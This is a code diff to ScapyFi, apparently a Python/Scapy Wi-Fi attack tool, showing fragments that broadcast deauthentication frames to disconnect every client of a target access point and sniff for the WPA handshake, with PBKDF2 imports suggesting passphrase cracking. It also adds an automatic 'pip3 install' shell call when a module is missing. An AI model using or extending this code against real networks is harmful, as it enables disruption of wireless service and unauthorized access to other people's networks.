@@ -1,4 +1,5 @@
 #!/usr/bin/python
+
 from scapy.all import *
 import sys
 import signal
@@ -7,7 +8,11 @@ import hashlib
 import hmac
 import os
 import binascii
-from pbkdf2 import PBKDF2
+try:
+    from pbkdf2 import PBKDF2
+except:
+    print("Missing module pbkdf2 Installing...")
+    os.system("pip3 install pbkdf2")
 import binascii
 import hmac
 import hashlib
@@ -42,7 +47,6 @@ class AP:
         self.client_mac = None
     def print_ap(self):
         print("MAC: " + TGREEN + self.mac + TWHITE +  " SSID: " + TGREEN + self.ssid + TWHITE + " CH: " + TGREEN + str(self.channel) + TWHITE + " CIPHER: " + TGREEN + self.cipher + TWHITE)
-
 
 
 #Banner function
@@ -108,8 +112,8 @@ def check_root():
 
 #Check the argument passed to the script
 def check_args():
-    if(len(sys.argv) < 3):
-        print("Missing argument: ScapyFi.py -i interface_name")
+    if(len(sys.argv) < 3 or len(sys.argv) > 3):
+        print("Wrong usage: ScapyFi.py -i interface_name")
         exit(1)
     if(sys.argv[1] != "-i"):
         print("Argument "+ str(sys.argv[1]) + " not understood")
@@ -206,7 +210,7 @@ def deauth(ap):
     time.sleep(3)
     target_mac = "ff:ff:ff:ff:ff:ff" #Deauth All clients
     gateway_mac = ap.mac
-    print("Sending Deauth Frame to " + ap.mac+"...")
+    print("Sending Deauth Frame to " + gateway_mac+"...")
     # Contructing the 802.11 frame:
 
     #Params :
@@ -272,7 +276,7 @@ def grab_handshake(ap):
 
 
 
-    p = sniff(iface=interface, stop_filter=checkForWPAHandshake) #Sniff for handshake
+    p = sniff(iface=interface, stop_filter=checkForWPAHandshake, filter="(ether dst "+ap.mac+") or (ether src "+ap.mac+")") #Sniff for handshake
 
     #Out of the sniff function -> checkForWPAHandshake = True => Handshake grabbed
 
